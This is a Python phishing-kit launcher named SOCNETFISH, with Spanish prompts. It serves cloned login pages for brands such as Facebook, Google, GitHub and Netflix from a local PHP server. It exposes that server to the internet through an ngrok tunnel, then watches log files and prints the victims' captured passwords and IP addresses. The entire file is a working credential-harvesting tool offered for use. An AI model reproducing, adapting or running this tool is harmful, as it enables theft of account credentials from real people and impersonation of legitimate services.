#!/usr/bin/python3
#SOCNETFISH V02
#Crate by WH117

import os
import stat
import zipfile
import requests
import subprocess

from getpass import getuser
from pyngrok import ngrok
from signal import signal, SIGINT
from colorama import Fore, Back,init

init()

class hunter():
    def __init__(self):
        os.system('clear')
        self.banner()
    
    def handler(signal_received, frame):
        print("\n")
        resInput = input("Se precionó Ctrl+c. ¿Desea terminar Socnetfish ahora? y/n: ");
        if (resInput == 'y'):
            print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
            os.system('clear')
            exit(0)

    signal(SIGINT, handler)

    def banner(self):
        print(Fore.RED)
        print("   _____ ____  _______   _____________________________ __  __ ")
        print("  / ___// __ \/ ____/ | / / ____/_  __/ ____/  _/ ___// / / / ")
        print("  \__ \/ / / / /   /  |/ / __/   / / / /_   / / \__ \/ /_/ /  ")
        print(" ___/ / /_/ / /___/ /|  / /___  / / / __/ _/ / ___/ / __  /   ")
        print("/____/\____/\____/_/ |_/_____/ /_/ /_/   /___//____/_/ /_/    ")
        print("\t\tBIENVENIDO A SOCNETFISH V01" + Fore.RESET)
        print("\t\t\tBy WH117")

        self.verificarNgrok()

        print(Fore.GREEN + "SELECCIONA UNA CATEGORÍA" + Fore.RESET)
        print("[" + Fore.RED + "1" + Fore.RESET + "] Facebook"  + "\t" + "[" + Fore.RED + "6" + Fore.RESET + "] Spotify"    + "\t" + "[" + Fore.RED + "10" + Fore.RESET + "] Instafollowers")
        print("[" + Fore.RED + "2" + Fore.RESET + "] Instagram" + "\t" + "[" + Fore.RED + "7" + Fore.RESET + "] Microsoft"  + "\t" + "[" + Fore.RED + "11" + Fore.RESET + "] Linkedin")
        print("[" + Fore.RED + "3" + Fore.RESET + "] Twitter"   + "\t" + "[" + Fore.RED + "8" + Fore.RESET + "] GitHub"     + "\t" + "[" + Fore.RED + "12" + Fore.RESET + "] Proton Mail")
        print("[" + Fore.RED + "4" + Fore.RESET + "] Google"    + "\t" + "[" + Fore.RED + "9" + Fore.RESET + "] SnapChat"   + "\t" + "[" + Fore.RED + "13" + Fore.RESET + "] Steam")
        print("[" + Fore.RED + "5" + Fore.RESET + "] Netflix"   + "\t" + "[" + Fore.RED + "0" + Fore.RESET + "] " + Fore.YELLOW + "Salir" + Fore.RESET)

        print(Fore.CYAN)
        self.numS = input("-> ")
        print(Fore.RESET)
        self.iniPhish(self.numS)

    def verificarNgrok(self):
        self.usuario = getuser()
        self.rutaNgrok = '/home/' + self.usuario + '/ngrok'
        if os.path.isfile(self.rutaNgrok):
            print("\t\t--Todo listo para iniciar--\n")
        else:
            self.urlNgrok = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
            print(Fore.YELLOW + "DESCARGANDO NGROK" + Fore.RESET)
            self.ngrokZip = requests.get(self.urlNgrok)
            open('/home/' + self.usuario + '/ngrok.zip', 'wb').write(self.ngrokZip.content)
            print(Fore.GREEN + "DESCARGA FINALIZADA" + Fore.RESET)
            self.password = None
            self.ngzip = zipfile.ZipFile('/home/' + self.usuario + '/ngrok.zip', "r")
            try:
                self.ngzip.extractall(pwd=self.password, path='/home/' + self.usuario + '/')
                print(Fore.YELLOW + "EL ARCHIVO SE DECOMPRIMIÓ CON ÉXITO" + Fore.RESET)
                self.ngzip.close()
                os.chmod(self.rutaNgrok, stat.S_IXUSR + stat.S_IRUSR + stat.S_IWUSR + stat.S_IRGRP + stat.S_IXGRP)
                os.system("rm -r /home/" + self.usuario + "/ngrok.zip")
            except:
                print(Fore.RED + "OCURRIÓ UN ERROR DURANTE LA EXTRACCIÓN DE LOS ARCHIVOS" + Fore.RESET)

    def runingServerPhish(self, route):
        print(Fore.YELLOW + "INICIANDO SERVIDOR PHP..." + Fore.RESET)
        os.system("cd " + route + " && nohup php -S localhost:8080 &")
        print(Fore.GREEN + "SERVIDOR INICIADO CORRECTAMENTE: http://localhost:8080" + Fore.RESET)
        print(Fore.YELLOW + "A CONTINUACIÓN EJECUTE EL SIGUIENTE COMANDO EN UNA NUEVA VENTANA" + Fore.RESET)

        os.system("/home/" + self.usuario + "/./ngrok http 8080 --log=stdout > /home/" + self.usuario + "/ngrok.log &")
        
        self.tunel = ngrok.connect(bind_tls=True)
        print("URL => " + self.tunel)

        print("EN ESPERA DE UNA CONTRASEÑA")

        self.ruta = "/home/" + self.usuario + "/.config/socnetfish"
        self.passFile = "/home/" + self.usuario + "/.config/socnetfish/usernames.txt"
        self.ipFile = "/home/" + self.usuario + "/.config/socnetfish/ip.txt"
        
        if(os.path.isdir(self.ruta) == False):
            print(Fore.YELLOW + "CREANDO RUTA DE ARCHIVOS TXT" + Fore.RESET)
            os.system("mkdir " + self.ruta)
            print(Fore.GREEN + "RUTA CREADA CORRECTAMENTE" + Fore.RESET)            

        if (os.path.isfile(self.passFile) == False):
            print(Fore.YELLOW + "CREANDO ARCHIVO USERNAMES.TXT" + Fore.RESET)
            os.system("touch " + self.passFile)
            print(Fore.GREEN + "ARCHIVO CREADO CORRECTAMENTE" + Fore.RESET)

        self.tamArchivoInicial = os.path.getsize(self.passFile)

        if (os.path.isfile(self.ipFile) == False):
            print(Fore.YELLOW + "CREANDO ARCHIVO IP.TXT" + Fore.RESET)
            os.system("touch " + self.ipFile)
            print(Fore.GREEN + "ARCHIVO CREADO CORRECTAMENTE" + Fore.RESET)

        self.tamArchivoInicialIP = os.path.getsize(self.ipFile)

        print(Fore.YELLOW + "CAPTURANDO INFORMACIÓN DEL SERVIDOR" + Fore.RESET)

        while(True):
            self.tamArchivoActual = os.path.getsize(self.passFile)
            self.tamArchivoActualIP = os.path.getsize(self.ipFile)

            self.fileAccount = open(self.passFile, 'r')
            self.fileIp = open(self.ipFile, 'r')

            self.readFileAccount = self.fileAccount.read()
            self.readFileIp = self.fileIp.read()

            if (self.tamArchivoActual > self.tamArchivoInicial and self.tamArchivoActualIP > self.tamArchivoInicialIP):
                os.system("clear")
                print(Fore.GREEN + "----- CONTRASEÑA CAPTURADA -----" + Fore.RESET)
                print(Fore.CYAN + self.readFileAccount + Fore.RESET)

                print(Fore.GREEN + "***** IP CAPTURADA *****" + Fore.RESET)
                print(Fore.CYAN + self.readFileIp + Fore.RESET)

                self.fileAccount.close()
                self.fileIp.close()

                self.tamArchivoInicial = self.tamArchivoActual
                self.tamArchivoInicialIP = self.tamArchivoActualIP
            else:
                self.fileAccount.close()
                self.fileIp.close()

    def iniPhish(self, numSelect):
        if (numSelect == "1"):
            self.routePshih = "sites/facebook/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "2"):
            self.routePshih = "sites/instagram/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "3"):
            self.routePshih = "sites/twitter/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "4"):
            self.routePshih = "sites/google/"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "5"):
            self.routePshih = "sites/netflix"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "6"):
            self.routePshih = "sites/spotify"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "7"):
            self.routePshih = "sites/microsoft"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "8"):
            self.routePshih = "sites/github"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "9"):
            self.routePshih = "sites/snapchat"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "10"):
            self.routePshih = "sites/instafollowers"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "11"):
            self.routePshih = "sites/linkedin"
            self.runingServerPhish(self.routePshih)
        elif (numSelect == "0"):
            print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
            os.system('clear')
            exit(0)
        else:
            print(Fore.RED + "SELECCIÓN NO ENCONTRADA" + Fore.RESET)

if __name__ == '__main__':
    h = hunter()
